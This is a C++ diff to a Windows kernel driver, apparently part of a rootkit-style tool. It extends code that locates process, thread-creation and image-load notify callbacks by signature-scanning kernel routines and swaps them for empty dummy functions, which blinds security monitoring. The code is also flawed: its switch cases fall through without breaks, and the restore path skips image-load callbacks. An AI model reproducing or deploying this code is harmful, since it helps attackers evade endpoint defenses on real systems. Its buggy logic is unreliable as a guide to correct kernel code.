@@ -2,13 +2,19 @@
 #include "pch.h"
 
 constexpr UCHAR PspCreateProcessNotifyRoutineSignature[] = { 0x4C, 0x8D, 0xCC };
-constexpr UCHAR PspSetCreateProcessNotifyRoutineSignature[] = { 0xE8, 0xCC };
-constexpr UCHAR PspCreateProcessNotifyRoutineCountExSignature[] = { 0xF0, 0xFF, 0x05, 0xCC };
+constexpr UCHAR PspCreateThreadNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
+constexpr UCHAR PspLoadImageNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
+constexpr UCHAR CallFunctionSignature[] = { 0xE8, 0xCC };
+constexpr UCHAR PspArrayCountSignature[] = { 0xF0, 0xFF, 0x05, 0xCC };
 constexpr SIZE_T PspSetCreateProcessNotifyRoutineSignatureDistance = 0x20;
+constexpr SIZE_T PspSetCreateThreadNotifyRoutineSignatureDistance = 0xF;
+constexpr SIZE_T PsSetLoadImageNotifyRoutineExDistance = 0xF;
 constexpr SIZE_T PspCreateProcessNotifyRoutineDistance = 0xC3;
+constexpr SIZE_T PspCreateThreadNotifyRoutineDistance = 0x9B;
+constexpr SIZE_T PspLoadImageNotifyRoutineDistance = 0x10B;
 constexpr SIZE_T PsNotifyRoutinesRoutineOffset = 5;
 constexpr SIZE_T RoutinesListOffset = 7;
-constexpr SIZE_T PsNotifyRoutinesRoutineCountOffsetEx = 0x7;
+constexpr SIZE_T PspArrayCountOffset = 7;
 constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xB;
 
 NTSTATUS RestoreCallback(KernelCallback* Callback);
@@ -20,6 +26,8 @@ OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_P
 VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info);
 void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
 void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create);
+void CreateThreadNotifyDummyFunction(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
+void LoadImageNotifyDummyFunction(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo);
 NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
 NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);
 
@@ -76,7 +84,8 @@ NTSTATUS RestoreCallback(KernelCallback* Callback) {
 
 		ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
 	}
-	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx) {
+	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx ||
+			 Callback->Type == PsCreateThreadType || Callback->Type == PsCreateThreadTypeNonSystemThread) {
 		PsRoutinesList routines{};
 		ULONG64 replacedFunction = 0;
 		routines.Type = Callback->Type;
@@ -86,6 +95,11 @@ NTSTATUS RestoreCallback(KernelCallback* Callback) {
 			replacedFunction = (ULONG64)CreateProcessNotifyDummyFunction;
 		case PsCreateProcessTypeEx:
 			replacedFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
+		case PsCreateThreadType:
+		case PsCreateThreadTypeNonSystemThread:
+			replacedFunction = (ULONG64)CreateThreadNotifyDummyFunction;
+		case PsImageLoadType:
+			replacedFunction = (ULONG64)LoadImageNotifyDummyFunction;
 		}
 
 		status = ListPsNotifyRoutines(&routines, Callback->CallbackAddress, replacedFunction);
@@ -147,7 +161,9 @@ NTSTATUS RemoveCallback(KernelCallback* Callback) {
 
 		ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
 	}
-	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx) {
+	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx || 
+			 Callback->Type == PsCreateThreadType || Callback->Type == PsCreateThreadTypeNonSystemThread ||
+			 Callback->Type == PsImageLoadType) {
 		PsRoutinesList routines{};
 		ULONG64 replacerFunction = 0;
 		routines.Type = Callback->Type;
@@ -157,6 +173,11 @@ NTSTATUS RemoveCallback(KernelCallback* Callback) {
 			replacerFunction = (ULONG64)CreateProcessNotifyDummyFunction;
 		case PsCreateProcessTypeEx:
 			replacerFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
+		case PsCreateThreadType:
+		case PsCreateThreadTypeNonSystemThread:
+			replacerFunction = (ULONG64)CreateThreadNotifyDummyFunction;
+		case PsImageLoadType:
+			replacerFunction = (ULONG64)LoadImageNotifyDummyFunction;
 		}
 
 		status = ListPsNotifyRoutines(&routines, replacerFunction, Callback->CallbackAddress);
@@ -204,15 +225,6 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 	switch (Callbacks->Type) {
 	case PsCreateProcessTypeEx:
 	case PsCreateProcessType: {
-		targetFunctionSigLen = sizeof(PspSetCreateProcessNotifyRoutineSignature);
-		targetFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);
-
-		if (!targetFunctionSignature) {
-			status = STATUS_INSUFFICIENT_RESOURCES;
-			break;
-		}
-		
-		RtlCopyMemory(targetFunctionSignature, PspSetCreateProcessNotifyRoutineSignature, targetFunctionSigLen);
 		searchedRoutineAddress = (PVOID)PsSetCreateProcessNotifyRoutineEx;
 		targetFunctionDistance = PspSetCreateProcessNotifyRoutineSignatureDistance;
 
@@ -226,17 +238,41 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 
 		RtlCopyMemory(listSignature, PspCreateProcessNotifyRoutineSignature, listSigLen);
 		listDistance = PspCreateProcessNotifyRoutineDistance;
+		break;
+	}
+	case PsCreateThreadType:
+	case PsCreateThreadTypeNonSystemThread:
+	{
+		searchedRoutineAddress = (PVOID)PsSetCreateThreadNotifyRoutine;
+		targetFunctionDistance = PspSetCreateThreadNotifyRoutineSignatureDistance;
 
-		listCountSigLen = sizeof(PspCreateProcessNotifyRoutineCountExSignature);
-		listCountSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listCountSigLen, DRIVER_TAG);
+		listSigLen = sizeof(PspCreateThreadNotifyRoutineSignature);
+		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);
 
-		if (!listCountSignature) {
+		if (!listSignature) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
 
-		RtlCopyMemory(listCountSignature, PspCreateProcessNotifyRoutineCountExSignature, listCountSigLen);
-		countOffset = PsNotifyRoutinesRoutineCountOffsetEx;
+		RtlCopyMemory(listSignature, PspCreateThreadNotifyRoutineSignature, listSigLen);
+		listDistance = PspCreateThreadNotifyRoutineDistance;
+		break;
+	}
+	case PsImageLoadType:
+	{
+		searchedRoutineAddress = (PVOID)PsSetLoadImageNotifyRoutine;
+		targetFunctionDistance = PsSetLoadImageNotifyRoutineExDistance;
+
+		listSigLen = sizeof(PspLoadImageNotifyRoutineSignature);
+		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);
+
+		if (!listSignature) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+
+		RtlCopyMemory(listSignature, PspLoadImageNotifyRoutineSignature, listSigLen);
+		listDistance = PspLoadImageNotifyRoutineDistance;
 		break;
 	}
 	default:
@@ -247,7 +283,25 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 	if (!NT_SUCCESS(status))
 		goto Cleanup;
 
-	// Find offset of PspCreateProcessNotifyRoutine
+	targetFunctionSigLen = sizeof(CallFunctionSignature);
+	targetFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);
+
+	if (!targetFunctionSignature) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		goto Cleanup;
+	}
+	RtlCopyMemory(targetFunctionSignature, CallFunctionSignature, targetFunctionSigLen);
+
+	listCountSigLen = sizeof(PspArrayCountSignature);
+	listCountSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listCountSigLen, DRIVER_TAG);
+
+	if (!listCountSignature) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		goto Cleanup;
+	}
+	RtlCopyMemory(listCountSignature, PspArrayCountSignature, listCountSigLen);
+	countOffset = PspArrayCountOffset;
+
 	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, targetFunctionSigLen - 1);
 
 	if (!searchedRoutineOffset)
@@ -259,6 +313,7 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 
 	if (!routinesListOffset)
 		return STATUS_NOT_FOUND;
+
 	PUCHAR routinesList = (PUCHAR)searchedRoutineAddress + *(routinesListOffset) + foundIndex + RoutinesListOffset;
 
 	PLONG routinesLengthOffset = (PLONG)FindPattern((PCUCHAR)listCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, listCountSigLen - 1);
@@ -268,7 +323,9 @@ NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunctio
 
 	if (Callbacks->Type == PsCreateProcessType)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
-	// Callbacks->NumberOfRoutines = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
+	else if (Callbacks->Type == PsCreateThreadTypeNonSystemThread)
+		countOffset = PsNotifyRoutinesRoutineCountOffset;
+	
 	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
 
 	for (SIZE_T i = 0; i < routinesCount; i++) {
@@ -536,5 +593,37 @@ void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS
 * There is no return value.
 */
 void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) {
+	return;
+}
+
+/*
+* Description:
+* CreateThreadNotifyDummyFunction is a dummy function for create thread notify routine.
+*
+* Parameters:
+* @ProcessId [HANDLE]  -- Unused.
+* @ThreadId  [HANDLE]  -- Unused.
+* @Create	 [BOOLEAN] -- Unused.
+*
+* Returns:
+* There is no return value.
+*/
+void CreateThreadNotifyDummyFunction(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
+	return;
+}
+
+/*
+* Description:
+* LoadImageNotifyDummyFunction is a dummy function for load image notify routine.
+*
+* Parameters:
+* @FullImageName [PUNICODE_STRING] -- Unused.
+* @ProcessId	 [HANDLE]		   -- Unused.
+* @ImageInfo	 [PIMAGE_INFO]	   -- Unused.
+*
+* Returns:
+* There is no return value.
+*/
+void LoadImageNotifyDummyFunction(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo) {
 	return;
 }
